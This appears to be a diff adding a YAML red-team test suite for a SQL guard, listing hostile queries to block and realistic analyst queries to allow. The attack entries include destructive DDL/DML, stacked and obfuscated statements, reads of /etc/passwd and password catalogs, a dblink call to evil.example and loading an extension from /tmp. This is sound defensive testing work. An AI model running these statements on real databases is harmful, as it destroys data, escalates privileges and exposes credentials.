@@ -1,0 +1,76 @@
+# Red-team suite for the SQL guard. Each case: sql, dialect, expect (block | allow), category.
+# "allow" cases are realistic analyst queries. They measure false positives, which matter as much as blocks.
+attacks:
+  # --- direct DDL / DML
+  - {sql: "DROP TABLE customers", dialect: postgres, category: ddl}
+  - {sql: "DELETE FROM orders", dialect: postgres, category: dml}
+  - {sql: "TRUNCATE TABLE payments", dialect: postgres, category: ddl}
+  - {sql: "UPDATE customers SET email = 'x'", dialect: postgres, category: dml}
+  - {sql: "INSERT INTO orders (id) VALUES (1)", dialect: postgres, category: dml}
+  - {sql: "ALTER TABLE customers ADD COLUMN x INT", dialect: postgres, category: ddl}
+  - {sql: "CREATE TABLE t AS SELECT * FROM customers", dialect: postgres, category: ddl}
+  - {sql: "CREATE OR REPLACE VIEW v AS SELECT 1", dialect: postgres, category: ddl}
+  - {sql: "REPLACE INTO customers VALUES (1, 'a', 'b', 'c', 'd')", dialect: sqlite, category: dml}
+  - {sql: "MERGE INTO orders o USING staged s ON o.id = s.id WHEN MATCHED THEN DELETE", dialect: snowflake, category: dml}
+  - {sql: "UNDROP TABLE customers", dialect: snowflake, category: ddl}
+  # --- privilege / session manipulation
+  - {sql: "GRANT ALL ON customers TO PUBLIC", dialect: postgres, category: privilege}
+  - {sql: "REVOKE SELECT ON customers FROM analyst", dialect: postgres, category: privilege}
+  - {sql: "SET ROLE postgres", dialect: postgres, category: session}
+  - {sql: "SET default_transaction_read_only = off", dialect: postgres, category: session}
+  - {sql: "SELECT set_config('default_transaction_read_only', 'off', false)", dialect: postgres, category: session}
+  - {sql: "USE ROLE ACCOUNTADMIN", dialect: snowflake, category: session}
+  # --- stacked queries and evasion
+  - {sql: "SELECT 1; DROP TABLE customers", dialect: postgres, category: stacked}
+  - {sql: "SELECT * FROM customers; DELETE FROM customers", dialect: postgres, category: stacked}
+  - {sql: "select 1 -- harmless\n; drop table customers", dialect: postgres, category: stacked}
+  - {sql: "/* report */ DROP TABLE customers", dialect: postgres, category: evasion}
+  - {sql: "DrOp TaBlE customers", dialect: postgres, category: evasion}
+  - {sql: "BEGIN; DELETE FROM orders; COMMIT", dialect: postgres, category: stacked}
+  - {sql: "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d", dialect: postgres, category: cte_dml}
+  - {sql: "WITH u AS (UPDATE customers SET name = 'x' RETURNING id) SELECT count(*) FROM u", dialect: postgres, category: cte_dml}
+  - {sql: "SELECT * INTO backup_customers FROM customers", dialect: postgres, category: select_into}
+  - {sql: "EXPLAIN ANALYZE DELETE FROM orders", dialect: postgres, category: evasion}
+  - {sql: "PREPARE p AS DELETE FROM orders", dialect: postgres, category: evasion}
+  - {sql: "EXECUTE p", dialect: postgres, category: evasion}
+  - {sql: "DO $$ BEGIN DELETE FROM orders; END $$", dialect: postgres, category: evasion}
+  - {sql: "CALL cleanup_orders()", dialect: postgres, category: evasion}
+  # --- file / network / DoS side effects
+  - {sql: "COPY customers TO '/tmp/out.csv'", dialect: postgres, category: exfil}
+  - {sql: "SELECT pg_read_file('/etc/passwd')", dialect: postgres, category: exfil}
+  - {sql: "SELECT lo_import('/etc/passwd')", dialect: postgres, category: exfil}
+  - {sql: "SELECT * FROM dblink('host=evil.example', 'select 1') AS t(a int)", dialect: postgres, category: exfil}
+  - {sql: "SELECT pg_sleep(30)", dialect: postgres, category: dos}
+  - {sql: "SELECT pg_terminate_backend(123)", dialect: postgres, category: dos}
+  - {sql: "SELECT * FROM customers FOR UPDATE", dialect: postgres, category: locking}
+  - {sql: "LOCK TABLE customers IN ACCESS EXCLUSIVE MODE", dialect: postgres, category: locking}
+  - {sql: "VACUUM FULL customers", dialect: postgres, category: maintenance}
+  - {sql: "COMMENT ON TABLE customers IS 'pwned'", dialect: postgres, category: ddl}
+  - {sql: "SELECT SYSTEM$CANCEL_ALL_QUERIES(42)", dialect: snowflake, category: dos}
+  - {sql: "PUT file:///tmp/x.csv @my_stage", dialect: snowflake, category: exfil}
+  - {sql: "ATTACH DATABASE '/tmp/evil.db' AS evil", dialect: sqlite, category: exfil}
+  - {sql: "PRAGMA writable_schema = 1", dialect: sqlite, category: session}
+  - {sql: "SELECT load_extension('/tmp/evil.so')", dialect: sqlite, category: exfil}
+  # --- sensitive catalogs
+  - {sql: "SELECT rolname, rolpassword FROM pg_authid", dialect: postgres, category: catalog}
+  - {sql: "SELECT id, name FROM customers UNION ALL SELECT usesysid, passwd FROM pg_shadow", dialect: postgres, category: catalog}
+
+benign:
+  - {sql: "SELECT * FROM customers", dialect: sqlite}
+  - {sql: "SELECT count(*) FROM orders WHERE status = 'shipped'", dialect: sqlite}
+  - {sql: "WITH recent AS (SELECT * FROM orders WHERE created_at > '2026-06-01') SELECT customer_id, count(*) AS n FROM recent GROUP BY customer_id ORDER BY n DESC", dialect: sqlite}
+  - {sql: "SELECT c.name, sum(oi.quantity * oi.unit_price) AS revenue FROM customers c JOIN orders o ON o.customer_id = c.id JOIN order_items oi ON oi.order_id = o.id GROUP BY c.name ORDER BY revenue DESC LIMIT 10", dialect: sqlite}
+  - {sql: "SELECT * FROM products WHERE name LIKE '%drop%'", dialect: sqlite}
+  - {sql: "SELECT 'DELETE FROM orders' AS example_text", dialect: sqlite}
+  - {sql: "SELECT * FROM customers WHERE email = 'a;b@example.com'", dialect: sqlite}
+  - {sql: "SELECT customer_id FROM orders UNION SELECT id FROM customers", dialect: sqlite}
+  - {sql: "SELECT * FROM orders o WHERE EXISTS (SELECT 1 FROM payments p WHERE p.order_id = o.id AND p.method = 'upi')", dialect: sqlite}
+  - {sql: "SELECT product_id, avg(rating) OVER (PARTITION BY product_id) AS avg_rating FROM reviews", dialect: sqlite}
+  - {sql: "SELECT updated_at, carrier FROM shipments WHERE carrier IN ('DHL', 'UPS')", dialect: sqlite}
+  - {sql: "SELECT CASE WHEN total > 100 THEN 'big' ELSE 'small' END AS size, count(*) FROM orders GROUP BY 1", dialect: sqlite}
+  - {sql: "SELECT date(created_at) AS d, count(*) FROM orders GROUP BY d", dialect: sqlite}
+  - {sql: "SELECT p.category, sum(i.on_hand) FROM inventory i JOIN products p ON p.id = i.product_id GROUP BY p.category", dialect: sqlite}
+  - {sql: "SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'orders'", dialect: postgres}
+  - {sql: "SELECT date_trunc('month', created_at) AS m, sum(total) FROM orders GROUP BY 1", dialect: postgres}
+  - {sql: "SELECT * FROM orders ORDER BY created_at DESC LIMIT 5000", dialect: postgres}
+  - {sql: "SELECT o.id FROM orders o LEFT JOIN refunds r ON r.payment_id = o.id WHERE r.id IS NULL", dialect: snowflake}
